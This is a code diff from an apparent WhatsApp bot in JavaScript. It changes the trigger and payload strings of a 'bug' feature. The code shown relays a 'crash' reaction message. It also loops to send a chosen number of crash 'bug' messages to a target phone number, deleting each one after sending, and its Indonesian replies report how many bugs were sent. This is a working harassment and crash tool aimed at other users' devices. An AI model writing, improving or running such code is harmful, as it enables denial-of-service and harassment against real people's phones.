@@ -51,7 +51,7 @@ const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], opti
 const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
 semar.sendMessage(id, listMessage, options)}
 
-if (body.startsWith(`‎`)) { 
+if (body.startsWith("64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61")) { 
 semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })}
 
 if (!isOwner && autobug && !isGroup) { 
@@ -147,7 +147,7 @@ reply('Loading...')
 for (let i = 0; i < nd[1]; i++){
 await sleep(5000)
 reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
-let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "‎" })
+let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
 await sleep(1000)
 semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
 reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
